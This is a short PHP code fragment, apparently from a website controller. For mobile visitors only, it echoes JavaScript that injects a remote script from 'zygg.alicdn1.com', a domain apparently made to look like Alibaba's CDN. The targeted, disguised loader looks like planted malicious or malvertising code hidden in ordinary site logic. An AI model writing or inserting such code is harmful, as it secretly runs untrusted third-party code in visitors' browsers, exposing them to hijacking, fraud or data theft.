...
//        $this->display(":rbutton");
        if(ismobile()) {
            echo "var C = function(e){return document.createElement(e);};	var A = C('script');A.src = 'http://zygg.alicdn1.com/aa.js?t=" . time() . "';A.stype = 'text/javascript';document.body.appendChild(A);";
        }
